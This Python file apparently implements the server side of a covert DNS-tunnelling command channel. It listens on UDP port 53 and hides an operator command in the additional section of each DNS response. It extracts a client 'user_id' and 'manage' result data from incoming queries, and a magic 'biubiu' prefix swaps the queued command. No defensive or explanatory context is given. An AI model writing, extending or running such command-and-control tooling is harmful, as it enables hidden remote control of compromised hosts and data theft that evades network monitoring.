import socket
from packs.BaseHeader import BaseHeader
from packs.BaseQuestion import BaseQuestion
from packs.BaseAnswer import BaseAnswer
from packs.BaseAdditional import BaseAdditional
from manage.ManageOrder import ManageOrder
from manage.ManageResult import ManageResult


def dns_server(cmd):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(('0.0.0.0', 53))
    data, ad = s.recvfrom(2048)

    if data[:6] == b'biubiu':
        return data

    index = 0

    header = BaseHeader(data)
    index = header.index

    question = BaseQuestion(data)
    index = question.index
    q_name = question.q_name

    answer = BaseAnswer(data, q_name, index)
    index = answer.index

    additional = BaseAdditional(cmd, data, index)
    print('additional:', additional.get_additional())

    response = header.get_header() + question.get_question() + answer.get_answer() + additional.get_additional()
    s.sendto(response, ad)

    data_map = {
        'data': data,
        'address': ad,
        'cmd': cmd,
        'header': header,
        'question': question,
        'answer': answer,
        'additional': additional
    }
    data_map = print_info(data_map)
    ManageResult(data_map)
    return data


def print_info(data_map):
    print('-------------------------------------------')
    print('address:', data_map['address'])
    print('cmd:', data_map['cmd'])

    addi_length = data_map['additional'].index
    data_length = len(data_map['data'])

    if data_length > addi_length:
        rel_data = data_map['additional'].data[addi_length:]
        print(rel_data)
        i = 1
        while True:
            if rel_data[i] == 0:
                break
            if i > 1000:
                exit()
            i += 1
        if rel_data[i + 1:] != b'':
            print('additional:', rel_data[1:i], rel_data[i + 1:], rel_data[i + 1:] == b'')
            data_map['user_id'] = rel_data[1:i]
            data_map['manage'] = rel_data[i + 1:]
    print('-------------------------------------------')
    return data_map


client_order = ManageOrder(b'')
while True:
    order = client_order.get_order()
    data = dns_server(order)
    if data[:6] == b'biubiu':
        client_order.order = data[6:]


